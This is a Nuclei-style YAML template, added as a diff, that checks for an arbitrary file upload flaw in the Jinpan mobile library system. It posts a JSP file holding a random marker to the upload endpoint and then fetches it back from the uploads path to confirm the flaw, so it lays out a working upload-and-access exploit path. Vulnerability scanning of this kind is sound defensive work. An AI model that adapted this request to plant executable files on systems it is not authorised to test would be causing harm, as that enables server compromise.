@@ -1,0 +1,58 @@
+id: poc-jinpan-mls-upload-anyfile-upload
+info:
+  name: 金盘移动图书馆系统 upload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects an arbitrary file upload vulnerability in the 金盘移动图书馆系统.
+  tags: file-upload
+
+variables:
+  t1: "{{base64(rand_text_alphanumeric(5))}}"
+  dt: "{{date_time('2006-01-02')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/common/upload/upload"
+    headers:
+      Content-Type: multipart/form-data; boundary=399e563f0389566bd40fd4d6409a67dd
+    body: |-
+      --399e563f0389566bd40fd4d6409a67dd
+      Content-Disposition: form-data; name="file"; filename="abcd.jsp"
+
+      {{t1}}
+      --399e563f0389566bd40fd4d6409a67dd--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "fileName"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        regex:
+          - "(?P<file>[0-9a-zA-Z]{32}).jsp"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/uploads/{{dt}}/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t1}}"
